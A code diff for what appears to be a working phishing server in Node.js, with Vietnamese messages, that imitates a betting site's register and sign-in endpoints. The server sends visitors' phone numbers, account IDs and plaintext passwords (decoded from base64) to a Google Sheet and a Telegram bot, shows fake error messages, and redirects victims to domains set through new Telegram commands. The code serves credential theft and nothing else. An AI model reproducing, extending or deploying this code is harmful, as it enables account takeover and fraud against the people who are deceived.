@@ -7,11 +7,14 @@ const TelegramBot = require("node-telegram-bot-api");
 
 // Import utilities
 const { googleSheetApi } = require("./utils/api");
-const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sendTelegram");
+const {
+  sendRegisterAccountToBot,
+  sendLoginAccountToBot,
+} = require("./utils/sendTelegram");
 const { generateRandomIPv6WithPrefix } = require("./utils/genIp");
 
 // Constants
-const PORT =  5050;
+const PORT = 5050;
 const GOOGLE_SHEET_URL = process.env.GOOGLE_SHEET_URL;
 
 // Initialize Express app
@@ -24,14 +27,18 @@ app.set("view engine", "ejs");
 app.use(bodyParser.urlencoded({ extended: false }));
 app.set("views", path.join(__dirname, "views"));
 app.use("/desktop", express.static(path.join(__dirname, "public", "desktop")));
-app.use("/FileSystem", express.static(path.join(__dirname, "public", "FileSystem", "Images")));
+app.use(
+  "/FileSystem",
+  express.static(path.join(__dirname, "public", "FileSystem", "Images"))
+);
 
 app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
 
 // Telegram Bot setup
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
-let redirectDomain = "https://erytw3555.net";
-
+let redirectDomain = "";
+let regDomain = "";
+let loginDomain = "";
 // Telegram Bot initialization check
 if (redirectDomain === "") {
   bot.sendMessage(
@@ -39,7 +46,37 @@ if (redirectDomain === "") {
     "Tên miền chuyển hướng chưa được thiết lập! Vui lòng dùng lệnh /domain để thiết lập!"
   );
 }
+if (regDomain === "") {
+  bot.sendMessage(
+    process.env.CHAT_ID,
+    "Tên miền đăng ký chưa được thiết lập! Vui lòng dùng lệnh /reg để thiết lập!"
+  );
+}
+if (loginDomain === "") {
+  bot.sendMessage(
+    process.env.CHAT_ID,
+    "Tên miền đăng nhập chưa được thiết lập! Vui lòng dùng lệnh /login để thiết lập!"
+  );
+}
 
+bot.onText(/\/login (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const domain = match[1];
+  loginDomain = `https://${domain}`;
+  bot.sendMessage(
+    chatId,
+    `Tên miền đăng nhập đã được thay đổi thành: ${loginDomain}`
+  );
+});
+bot.onText(/\/reg (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const domain = match[1];
+  regDomain = `https://${domain}`;
+  bot.sendMessage(
+    chatId,
+    `Tên miền đăng ký đã được thay đổi thành: ${regDomain}`
+  );
+});
 // Telegram Bot domain command
 bot.onText(/\/domain (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
@@ -50,10 +87,11 @@ bot.onText(/\/domain (.+)/, (msg, match) => {
 
 // Utility functions
 function getIp(req) {
-  const ip = req.headers['cf-connecting-ip'] || 
-  req.headers['x-real-ip'] ||
-  req.headers['x-forwarded-for'] ||
-  req.socket.remoteAddress;
+  const ip =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-real-ip"] ||
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress;
   return ip.toString();
 }
 
@@ -65,30 +103,34 @@ app.use((req, res, next) => {
 
 // Route handler utility
 const renderPage = (page) => (req, res) => {
-  const device = req.isMobile ? 'mobile' : 'desktop';
+  const device = req.isMobile ? "mobile" : "desktop";
   return res.render(`${device}/${page}`, {
     layout: `${device}/layout`,
-    redirectDomain
+    redirectDomain,
+    loginDomain,
+    regDomain,
   });
 };
 
 // API response utility
 const handleApiResponse = async (req, res, actionType) => {
   try {
-    const timeNow = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+    const timeNow = new Date().toLocaleString("vi-VN", {
+      timeZone: "Asia/Ho_Chi_Minh",
+    });
     const userIp = getIp(req);
-    
+
     let data = {
       action: actionType,
       timeNow,
       userIp,
-      ...req.body
+      ...req.body,
     };
 
-    if (actionType === 'register') {
+    if (actionType === "register") {
       const decodedPWD = Buffer.from(req.body.PWD, "base64").toString("utf-8");
       data.PWD = decodedPWD;
-      
+
       await Promise.all([
         googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL),
         sendRegisterAccountToBot(
@@ -98,17 +140,17 @@ const handleApiResponse = async (req, res, actionType) => {
           userIp,
           timeNow,
           decodedPWD
-        )
+        ),
       ]);
 
       return res.json({
         Error: {
           Code: 5999,
           Message: "Lỗi mạng, vui lòng làm mới giao diện",
-          Redirect: redirectDomain,
-        }
+          Redirect: regDomain,
+        },
       });
-    } else if (actionType === 'login') {
+    } else if (actionType === "login") {
       await Promise.all([
         googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
         sendLoginAccountToBot(
@@ -117,11 +159,11 @@ const handleApiResponse = async (req, res, actionType) => {
           req.body.phone,
           req.body.AccountID,
           req.body.AccountPWD
-        )
+        ),
       ]);
 
       return res.json({
-        Error: { Code: 1002, Message: "Tài khoản hoặc mật khẩu sai" }
+        Error: { Code: 1002, Message: "Tài khoản hoặc mật khẩu sai" },
       });
     }
   } catch (error) {
@@ -149,13 +191,13 @@ const mobileOnlyRoutes = [
   "/Mobile/Home/Index",
   "/Mobile/Home",
   "/Mobile/Register/Register",
-  "/Mobile/BonusCenter/LatestOffers"
+  "/Mobile/BonusCenter/LatestOffers",
 ];
 
-mobileOnlyRoutes.forEach(route => {
+mobileOnlyRoutes.forEach((route) => {
   app.get(route, (req, res) => {
     if (!req.isMobile) return res.redirect("/");
-    const page = route.split('/').pop().toLowerCase();
+    const page = route.split("/").pop().toLowerCase();
     return renderPage(page)(req, res);
   });
 });
@@ -181,8 +223,14 @@ app.post("/api/Common/IsMemberRegisterEnabled", (req, res) => {
   res.json({ Data: true });
 });
 
-app.post("/api/MemberInfo/RegisterMember", (req, res) => handleApiResponse(req, res, 'register'));
-app.post("/api/Authorize/SignIn", (req, res) => handleApiResponse(req, res, 'login'));
+app.post("/api/MemberInfo/RegisterMember", (req, res) =>
+  handleApiResponse(req, res, "register")
+);
+app.post("/api/Authorize/SignIn", (req, res) =>
+  handleApiResponse(req, res, "login")
+);
 
 // Start server
-app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
+app.listen(PORT, () =>
+  console.log(`Server running on http://localhost:${PORT}`)
+);
